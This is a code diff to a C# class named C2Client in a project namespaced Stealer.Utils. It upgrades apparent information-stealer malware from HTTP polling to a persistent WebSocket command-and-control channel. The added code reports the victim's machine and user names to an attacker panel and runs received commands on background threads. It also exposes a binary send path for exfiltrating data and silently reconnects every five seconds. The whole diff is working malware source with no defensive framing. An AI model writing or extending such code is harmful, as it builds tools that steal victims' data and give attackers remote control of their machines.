@@ -1,39 +1,110 @@
 using System;
-using System.Net;
+using System.Net.WebSockets;
 using System.Text;
+using System.Threading;
 
 namespace Stealer.Utils
 {
     public static class C2Client
     {
-        private static string _baseUrl;
+        private static ClientWebSocket _ws;
+        private static readonly object _sendLock = new object();
+        private static Action<string> _onCommand;
 
-        private static string BaseUrl
+        public static void Connect(string clientId, Action<string> onCommand)
         {
-            get
+            _onCommand = onCommand;
+
+            while (true)
             {
-                if (_baseUrl != null) return _baseUrl;
-                Config.Initialize();
-                string url = Config.PanelUrl.TrimEnd('/');
-                int idx = url.LastIndexOf("/api/upload");
-                if (idx > 0) url = url.Substring(0, idx);
-                _baseUrl = url;
-                return _baseUrl;
+                try
+                {
+                    _ws = new ClientWebSocket();
+                    string baseUrl = GetBaseUrl();
+                    string wsUrl = baseUrl.Replace("https://", "wss://").Replace("http://", "ws://") + "/api/c2/ws";
+
+                    _ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None).GetAwaiter().GetResult();
+
+                    string auth = "{\"type\":\"auth\",\"client_id\":\"" + Escape(clientId) +
+                                  "\",\"key\":\"" + Escape(Config.SecretKey) +
+                                  "\",\"hostname\":\"" + Escape(Environment.MachineName) +
+                                  "\",\"username\":\"" + Escape(Environment.UserName) + "\"}";
+                    SendText(auth);
+
+                    ReceiveLoop();
+                }
+                catch { }
+
+                try { _ws.Dispose(); } catch { }
+                _ws = null;
+                Thread.Sleep(5000);
             }
         }
 
-        public static string PollCommand(string clientId)
+        private static void ReceiveLoop()
         {
-            var wc = new WebClient();
-            if (!string.IsNullOrEmpty(Config.SecretKey))
-                wc.Headers["x-panel-key"] = Config.SecretKey;
+            var buffer = new byte[8192];
+            while (_ws != null && _ws.State == WebSocketState.Open)
+            {
+                try
+                {
+                    var seg = new ArraySegment<byte>(buffer);
+                    var result = _ws.ReceiveAsync(seg, CancellationToken.None).GetAwaiter().GetResult();
 
-            string url = BaseUrl + "/api/c2/command?client_id=" + Uri.EscapeDataString(clientId)
-                + "&hostname=" + Uri.EscapeDataString(Environment.MachineName)
-                + "&username=" + Uri.EscapeDataString(Environment.UserName);
+                    if (result.MessageType == WebSocketMessageType.Close)
+                        break;
 
-            string body = wc.DownloadString(url);
-            return ParseJsonKey(body, "command");
+                    if (result.MessageType == WebSocketMessageType.Text)
+                    {
+                        var sb = new StringBuilder();
+                        sb.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
+                        while (!result.EndOfMessage)
+                        {
+                            result = _ws.ReceiveAsync(seg, CancellationToken.None).GetAwaiter().GetResult();
+                            sb.Append(Encoding.UTF8.GetString(buffer, 0, result.Count));
+                        }
+
+                        string msg = sb.ToString();
+                        string type = ParseJsonKey(msg, "type");
+
+                        if (type == "command")
+                        {
+                            string cmd = ParseJsonKey(msg, "command");
+                            if (!string.IsNullOrEmpty(cmd) && _onCommand != null)
+                            {
+                                new Thread(() => { try { _onCommand(cmd); } catch { } })
+                                { IsBackground = true }.Start();
+                            }
+                        }
+                        else if (type == "ping")
+                        {
+                            SendText("{\"type\":\"pong\"}");
+                        }
+                    }
+                }
+                catch { break; }
+            }
+        }
+
+        public static void SendText(string text)
+        {
+            lock (_sendLock)
+            {
+                if (_ws == null || _ws.State != WebSocketState.Open) return;
+                var bytes = Encoding.UTF8.GetBytes(text);
+                _ws.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None)
+                    .GetAwaiter().GetResult();
+            }
+        }
+
+        public static void SendBinary(byte[] data)
+        {
+            lock (_sendLock)
+            {
+                if (_ws == null || _ws.State != WebSocketState.Open) return;
+                _ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Binary, true, CancellationToken.None)
+                    .GetAwaiter().GetResult();
+            }
         }
 
         private static string Escape(string s)
@@ -51,6 +122,15 @@ namespace Stealer.Utils
             int end = json.IndexOf("\"", start);
             if (end <= start) return null;
             return json.Substring(start, end - start);
+        }
+
+        private static string GetBaseUrl()
+        {
+            Config.Initialize();
+            string url = Config.PanelUrl.TrimEnd('/');
+            int idx = url.LastIndexOf("/api/upload");
+            if (idx > 0) url = url.Substring(0, idx);
+            return url;
         }
     }
 }
